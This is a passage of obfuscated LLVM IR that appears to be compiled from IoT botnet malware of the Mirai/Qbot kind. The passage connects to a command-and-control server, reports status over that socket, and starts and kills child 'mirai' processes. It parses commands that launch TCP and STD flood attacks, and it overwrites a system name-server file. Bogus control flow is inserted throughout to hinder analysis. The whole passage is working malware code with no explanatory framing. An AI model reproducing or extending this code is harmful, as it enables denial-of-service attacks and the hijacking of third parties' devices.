  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %455
  %2151 = load i32, i32* @miraiPid, align 4
  %2152 = call i32 @kill(i32 %2151, i32 9) #5
  store i32 0, i32* @miraiPid, align 4
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %474
  %2153 = load i8**, i8*** %12, align 8
  %2154 = getelementptr inbounds i8*, i8** %2153, i64 1
  %2155 = load i8*, i8** %2154, align 8
  %2156 = call i32 @strcmp(i8* %2155, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.931, i32 0, i32 0)) #9
  %2157 = icmp ne i32 %2156, 0
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %510
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %534
  %2158 = load i32, i32* %11, align 4
  %2159 = icmp slt i32 %2158, 2
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %584
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %623
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %644
  %2160 = load i32, i32* %25, align 4
  store i32 %2160, i32* @Phonepid, align 4
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %665
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %682
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %701
  %2161 = load i8**, i8*** %12, align 8
  %2162 = getelementptr inbounds i8*, i8** %2161, i64 0
  %2163 = load i8*, i8** %2162, align 8
  %2164 = call i32 @strcmp(i8* %2163, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.935, i32 0, i32 0)) #9
  %2165 = icmp ne i32 %2164, 0
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %768
  %2166 = load i32, i32* @testmiraiPid, align 4
  %2167 = call i32 @kill(i32 %2166, i32 9) #5
  store i32 0, i32* @testmiraiPid, align 4
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %797
  %2168 = call i32 @fork() #5
  store i32 %2168, i32* %26, align 4
  %2169 = load i32, i32* %26, align 4
  %2170 = icmp ugt i32 %2169, 0
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %817
  %2171 = load i32, i32* %26, align 4
  store i32 %2171, i32* @testmiraiPid, align 4
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %835
  %2172 = load i32, i32* %26, align 4
  %2173 = icmp eq i32 %2172, -1
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %863
  %2174 = load i32, i32* %11, align 4
  %2175 = icmp slt i32 %2174, 2
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %888
  %2176 = load i32, i32* @mainCommSock, align 4
  %2177 = call i32 (i32, i8*, ...) @sockprintf(i32 %2176, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.940, i32 0, i32 0))
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %921
  %2178 = load i8**, i8*** %12, align 8
  %2179 = getelementptr inbounds i8*, i8** %2178, i64 0
  %2180 = load i8*, i8** %2179, align 8
  %2181 = call i32 @strcmp(i8* %2180, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.941, i32 0, i32 0)) #9
  %2182 = icmp ne i32 %2181, 0
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %943
  %2183 = load i32, i32* %11, align 4
  %2184 = icmp ne i32 %2183, 2
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %972
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1001
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1027
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1046
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1063
  %2185 = load i8**, i8*** %12, align 8
  %2186 = getelementptr inbounds i8*, i8** %2185, i64 0
  %2187 = load i8*, i8** %2186, align 8
  %2188 = call i32 @strcmp(i8* %2187, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.475, i32 0, i32 0)) #9
  %2189 = icmp ne i32 %2188, 0
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1089
  %2190 = load i8**, i8*** %12, align 8
  %2191 = getelementptr inbounds i8*, i8** %2190, i64 1
  %2192 = load i8*, i8** %2191, align 8
  %2193 = call i32 @strcmp(i8* %2192, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.928, i32 0, i32 0)) #9
  %2194 = icmp ne i32 %2193, 0
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1124
  %2195 = load i32, i32* @bcmPid, align 4
  %2196 = icmp ne i32 %2195, 0
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1150
  %2197 = load i32, i32* %28, align 4
  %2198 = icmp eq i32 %2197, -1
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1169
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1204
  %2199 = load i8**, i8*** %12, align 8
  %2200 = getelementptr inbounds i8*, i8** %2199, i64 5
  %2201 = load i8*, i8** %2200, align 8
  %2202 = call i32 @atoi(i8* %2201) #9
  %2203 = icmp slt i32 %2202, 1
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1226
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1270
  %2204 = load i8**, i8*** %12, align 8
  %2205 = getelementptr inbounds i8*, i8** %2204, i64 0
  %2206 = load i8*, i8** %2205, align 8
  %2207 = call i32 @strcmp(i8* %2206, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.943, i32 0, i32 0)) #9
  %2208 = icmp ne i32 %2207, 0
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1307
  %2209 = load i8**, i8*** %12, align 8
  %2210 = getelementptr inbounds i8*, i8** %2209, i64 4
  %2211 = load i8*, i8** %2210, align 8
  %2212 = call i32 @atoi(i8* %2211) #9
  %2213 = icmp eq i32 %2212, -1
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1338
  %2214 = load i8**, i8*** %12, align 8
  %2215 = getelementptr inbounds i8*, i8** %2214, i64 5
  %2216 = load i8*, i8** %2215, align 8
  %2217 = call i32 @atoi(i8* %2216) #9
  %2218 = icmp slt i32 %2217, 1
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1360
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1395
  %2219 = load i8**, i8*** %12, align 8
  %2220 = getelementptr inbounds i8*, i8** %2219, i64 5
  %2221 = load i8*, i8** %2220, align 8
  %2222 = call i32 @atoi(i8* %2221) #9
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %1422
  %2223 = load i8*, i8** %29, align 8
  %2224 = call i8* @strtok(i8* %2223, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.915, i32 0, i32 0)) #5
  store i8* %2224, i8** %35, align 8
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %1441
  %2225 = load i8*, i8** %35, align 8
  %2226 = icmp ne i8* %2225, null
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1460
  %2227 = call i32 @listFork()
  %2228 = icmp ne i32 %2227, 0
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1488
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %1508
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %1533
  %2229 = load i8**, i8*** %12, align 8
  %2230 = getelementptr inbounds i8*, i8** %2229, i64 0
  %2231 = load i8*, i8** %2230, align 8
  %2232 = call i32 @strcmp(i8* %2231, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.944, i32 0, i32 0)) #9
  %2233 = icmp ne i32 %2232, 0
  br label %originalBB210

originalBB214alteredBB:                           ; preds = %originalBB214, %1555
  %2234 = load i32, i32* %11, align 4
  %2235 = icmp slt i32 %2234, 6
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %1580
  %2236 = load i8**, i8*** %12, align 8
  %2237 = getelementptr inbounds i8*, i8** %2236, i64 2
  %2238 = load i8*, i8** %2237, align 8
  %2239 = call i32 @atoi(i8* %2238) #9
  %2240 = icmp eq i32 %2239, -1
  br label %originalBB218

originalBB222alteredBB:                           ; preds = %originalBB222, %1620
  br label %originalBB222

originalBB226alteredBB:                           ; preds = %originalBB226, %1664
  %2241 = load i8**, i8*** %12, align 8
  %2242 = getelementptr inbounds i8*, i8** %2241, i64 5
  %2243 = load i8*, i8** %2242, align 8
  %2244 = call i32 @atoi(i8* %2243) #9
  br label %originalBB226

originalBB230alteredBB:                           ; preds = %originalBB230, %1694
  %2245 = load i8*, i8** %43, align 8
  %2246 = icmp ne i8* %2245, null
  br label %originalBB230

originalBB234alteredBB:                           ; preds = %originalBB234, %1713
  %2247 = call i32 @listFork()
  %2248 = icmp ne i32 %2247, 0
  br label %originalBB234

originalBB238alteredBB:                           ; preds = %originalBB238, %1740
  %2249 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.915, i32 0, i32 0)) #5
  store i8* %2249, i8** %43, align 8
  br label %originalBB238

originalBB242alteredBB:                           ; preds = %originalBB242, %1763
  %2250 = load i8*, i8** %36, align 8
  %2251 = load i32, i32* %37, align 4
  %2252 = load i32, i32* %38, align 4
  %2253 = load i8*, i8** %39, align 8
  %2254 = load i32, i32* %41, align 4
  %2255 = load i32, i32* %40, align 4
  %2256 = load i32, i32* %42, align 4
  call void @SendTCP(i8* %2250, i32 %2251, i32 %2252, i8* %2253, i32 %2254, i32 %2255, i32 %2256)
  call void @_exit(i32 0) #12
  br label %originalBB242

originalBB246alteredBB:                           ; preds = %originalBB246, %1787
  br label %originalBB246

originalBB250alteredBB:                           ; preds = %originalBB250, %1825
  br label %originalBB250

originalBB254alteredBB:                           ; preds = %originalBB254, %1857
  %2257 = load i8*, i8** %44, align 8
  %2258 = call i8* @strtok(i8* %2257, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.915, i32 0, i32 0)) #5
  store i8* %2258, i8** %47, align 8
  br label %originalBB254

originalBB258alteredBB:                           ; preds = %originalBB258, %1879
  %2259 = call i32 @listFork()
  %2260 = icmp ne i32 %2259, 0
  br label %originalBB258

originalBB262alteredBB:                           ; preds = %originalBB262, %1898
  %2261 = load i8*, i8** %47, align 8
  %2262 = load i32, i32* %45, align 4
  %2263 = load i32, i32* %46, align 4
  call void @sendSTD(i8* %2261, i32 %2262, i32 %2263)
  call void @_exit(i32 0) #12
  br label %originalBB262

originalBB266alteredBB:                           ; preds = %originalBB266, %1920
  br label %originalBB266

originalBB270alteredBB:                           ; preds = %originalBB270, %1952
  store i32 0, i32* %48, align 4
  store i64 0, i64* %49, align 8
  br label %originalBB270

originalBB274alteredBB:                           ; preds = %originalBB274, %1998
  %2264 = load i32, i32* %48, align 4
  %2265 = icmp sgt i32 %2264, 0
  br label %originalBB274

originalBB278alteredBB:                           ; preds = %originalBB278, %2017
  br label %originalBB278

originalBB282alteredBB:                           ; preds = %originalBB282, %2042
  call void @exit(i32 0) #11
  br label %originalBB282
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind
declare i64 @sysconf(i32) #3

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @getppid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  switch i32 %12, label %49 [
    i32 66051, label %13
    i32 50462976, label %14
    i32 33751041, label %31
    i32 16777986, label %32
  ]

; <label>:13:                                     ; preds = %0
  store i32 ptrtoint ([11 x i8]* @.str.952 to i32), i32* %1, align 4
  br label %66

; <label>:14:                                     ; preds = %0
  %15 = load i32, i32* @x.117
  %16 = load i32, i32* @y.118
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  store i32 ptrtoint ([14 x i8]* @.str.953 to i32), i32* %1, align 4
  %23 = load i32, i32* @x.117
  %24 = load i32, i32* @y.118
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %66

; <label>:31:                                     ; preds = %0
  store i32 ptrtoint ([13 x i8]* @.str.954 to i32), i32* %1, align 4
  br label %66

; <label>:32:                                     ; preds = %0
  %33 = load i32, i32* @x.117
  %34 = load i32, i32* @y.118
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  store i32 ptrtoint ([16 x i8]* @.str.955 to i32), i32* %1, align 4
  %41 = load i32, i32* @x.117
  %42 = load i32, i32* @y.118
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %66

; <label>:49:                                     ; preds = %0
  %50 = load i32, i32* @x.117
  %51 = load i32, i32* @y.118
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %49
  store i32 ptrtoint ([8 x i8]* @.str.956 to i32), i32* %1, align 4
  %58 = load i32, i32* @x.117
  %59 = load i32, i32* @y.118
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %66

; <label>:66:                                     ; preds = %originalBBpart28, %originalBBpart24, %31, %originalBBpart2, %13
  %67 = load i32, i32* %1, align 4
  ret i32 %67

originalBBalteredBB:                              ; preds = %originalBB, %14
  store i32 ptrtoint ([14 x i8]* @.str.953 to i32), i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  store i32 ptrtoint ([16 x i8]* @.str.955 to i32), i32* %1, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %49
  store i32 ptrtoint ([8 x i8]* @.str.956 to i32), i32* %1, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %26

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @x.119
  %9 = load i32, i32* @y.120
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* @mainCommSock, align 4
  %17 = call i32 @close(i32 %16)
  store i32 0, i32* @mainCommSock, align 4
  %18 = load i32, i32* @x.119
  %19 = load i32, i32* @y.120
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %0
  %27 = load i32, i32* @currentServer, align 4
  %28 = add nsw i32 %27, 1
  %29 = sext i32 %28 to i64
  %30 = icmp eq i64 %29, 1
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %26
  store i32 0, i32* @currentServer, align 4
  br label %35

; <label>:32:                                     ; preds = %26
  %33 = load i32, i32* @currentServer, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* @currentServer, align 4
  br label %35

; <label>:35:                                     ; preds = %32, %31
  %36 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %37 = load i32, i32* @currentServer, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %38
  %40 = load i8*, i8** %39, align 8
  %41 = call i8* @strcpy(i8* %36, i8* %40) #5
  store i32 6942, i32* %3, align 4
  %42 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %43 = call i8* @strchr(i8* %42, i32 58) #9
  %44 = icmp ne i8* %43, null
  br i1 %44, label %45, label %52

; <label>:45:                                     ; preds = %35
  %46 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %47 = call i8* @strchr(i8* %46, i32 58) #9
  %48 = getelementptr inbounds i8, i8* %47, i64 1
  %49 = call i32 @atoi(i8* %48) #9
  store i32 %49, i32* %3, align 4
  %50 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %51 = call i8* @strchr(i8* %50, i32 58) #9
  store i8 0, i8* %51, align 1
  br label %52

; <label>:52:                                     ; preds = %45, %35
  %53 = load i32, i32* @x.119
  %54 = load i32, i32* @y.120
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %61 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %61, i32* @mainCommSock, align 4
  %62 = load i32, i32* @mainCommSock, align 4
  %63 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %64 = load i32, i32* %3, align 4
  %65 = call i32 @connectTimeout(i32 %62, i8* %63, i32 %64, i32 30)
  %66 = icmp ne i32 %65, 0
  %67 = load i32, i32* @x.119
  %68 = load i32, i32* @y.120
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %66, label %92, label %75

; <label>:75:                                     ; preds = %originalBBpart24
  %76 = load i32, i32* @x.119
  %77 = load i32, i32* @y.120
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %75
  store i32 1, i32* %1, align 4
  %84 = load i32, i32* @x.119
  %85 = load i32, i32* @y.120
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %93

; <label>:92:                                     ; preds = %originalBBpart24
  store i32 0, i32* %1, align 4
  br label %93

; <label>:93:                                     ; preds = %92, %originalBBpart28
  %94 = load i32, i32* %1, align 4
  ret i32 %94

originalBBalteredBB:                              ; preds = %originalBB, %7
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i32 @close(i32 %95)
  store i32 0, i32* @mainCommSock, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  %97 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %97, i32* @mainCommSock, align 4
  %98 = load i32, i32* @mainCommSock, align 4
  %99 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %100 = load i32, i32* %3, align 4
  %101 = call i32 @connectTimeout(i32 %98, i8* %99, i32 %100, i32 30)
  %102 = icmp ne i32 %101, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %75
  store i32 1, i32* %1, align 4
  br label %originalBB6
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.950, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.950, i32 0, i32 0), i32 0) #5
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %32

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* @x.121
  %10 = load i32, i32* @y.122
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.951, i32 0, i32 0), i8** %2, align 8
  %17 = load i8*, i8** %2, align 8
  %18 = call i64 @strlen(i8* %17) #9
  store i64 %18, i64* %3, align 8
  %19 = load i16, i16* %1, align 2
  %20 = zext i16 %19 to i32
  %21 = load i8*, i8** %2, align 8
  %22 = load i64, i64* %3, align 8
  %23 = call i64 @write(i32 %20, i8* %21, i64 %22)
  %24 = load i32, i32* @x.121
  %25 = load i32, i32* @y.122
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:32:                                     ; preds = %0
  br label %37

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i16, i16* %1, align 2
  %35 = zext i16 %34 to i32
  %36 = call i32 @close(i32 %35)
  br label %37

; <label>:37:                                     ; preds = %33, %32
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %8
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.951, i32 0, i32 0), i8** %2, align 8
  %38 = load i8*, i8** %2, align 8
  %39 = call i64 @strlen(i8* %38) #9
  store i64 %39, i64* %3, align 8
  %40 = load i16, i16* %1, align 2
  %41 = zext i16 %40 to i32
  %42 = load i8*, i8** %2, align 8
  %43 = load i64, i64* %3, align 8
  %44 = call i64 @write(i32 %41, i8* %42, i64 %43)
  br label %originalBB
}

declare i32 @open(i8*, i32, ...) #1

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @getBuildz() #0 {
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.957, i32 0, i32 0), i32 0) #5
  %3 = icmp ne i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %0
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.958, i32 0, i32 0), i8** %1, align 8
  br label %6

; <label>:5:                                      ; preds = %0
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.959, i32 0, i32 0), i8** %1, align 8
  br label %6

; <label>:6:                                      ; preds = %5, %4
  %7 = load i8*, i8** %1, align 8
  ret i8* %7
}

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.125
  %5 = load i32, i32* @y.126
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  store i32 1, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %17 = load i32, i32* @x.125
  %18 = load i32, i32* @y.126
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %originalBBpart222, %originalBBpart2
  %26 = load i32, i32* @x.125
  %27 = load i32, i32* @y.126
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  %34 = load i32, i32* %15, align 4
  %35 = icmp eq i32 %34, 1
  %36 = load i32, i32* @x.125
  %37 = load i32, i32* @y.126
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %35, label %44, label %73

; <label>:44:                                     ; preds = %originalBBpart24
  %45 = load i32, i32* @x.125
  %46 = load i32, i32* @y.126
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %44
  %53 = load i32, i32* %16, align 4
  %54 = load i32, i32* %13, align 4
  %55 = icmp slt i32 %53, %54
  %56 = load i32, i32* @x.125
  %57 = load i32, i32* @y.126
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %55, label %64, label %73

; <label>:64:                                     ; preds = %originalBBpart28
  %65 = load i8*, i8** %12, align 8
  %66 = load i32, i32* %16, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %65, i64 %67
  %69 = getelementptr inbounds i8, i8* %68, i64 -1
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp ne i32 %71, 10
  br label %73

; <label>:73:                                     ; preds = %64, %originalBBpart28, %originalBBpart24
  %74 = phi i1 [ false, %originalBBpart28 ], [ false, %originalBBpart24 ], [ %72, %64 ]
  %75 = load i32, i32* @x.125
  %76 = load i32, i32* @y.126
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
